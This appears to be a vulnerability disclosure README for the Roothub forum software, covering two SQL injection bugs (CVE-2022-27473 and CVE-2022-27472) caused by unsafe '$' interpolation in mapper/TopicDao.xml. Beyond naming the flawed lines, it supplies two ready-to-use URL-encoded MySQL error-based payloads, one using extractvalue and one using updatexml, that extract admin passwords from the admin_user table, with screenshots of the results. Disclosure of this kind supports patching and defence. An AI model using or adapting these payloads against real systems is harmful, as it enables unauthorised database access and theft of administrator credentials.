# Roothub_vulns

Vulnerable codes:

## Bug 1 / CVE-2022-27473:
> Erroneously usage of "$" in mapper/TopicDao.xml:130:<br>
![image](https://user-images.githubusercontent.com/9525971/159167814-90697f99-74dc-496f-be04-c641db268602.png)<br><br>
## Bug 2 / CVE-2022-27472:
> Erroneously usage of "$" in mapper/TopicDao.xml:516:<br>
![image](https://user-images.githubusercontent.com/9525971/159168468-e1956c80-26dd-4ad9-84ef-2939688cd907.png)

<br><br>
> Payload: we can use "extractvalue" or "updatexml" function in mysql to trigger the exception and finish the exploitation of this SQLi vulnerability.
1. "extractvalue":
a%25'%20union%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cextractvalue('1'%2Cconcat('~'%2C(select%20password%20from%20admin_user)))%20from%20admin_user--%20

2. "updatexml":
xx%25%27%20and%20updatexml(1%2Cconcat(0x7e%2C(select%20password%20from%20admin_user)%2C0x7e)%2C3)--%20<br><br>

> Result:
1. "extractvalue":<br>
![image](https://user-images.githubusercontent.com/9525971/159168040-faae0fcd-d21c-4784-ab39-3faac5d6664e.png)<br>
2. "updatexml":<br>
![image](https://user-images.githubusercontent.com/9525971/159168005-c753cbf5-9f82-463c-9bcf-5dcfe8cdc6d6.png)

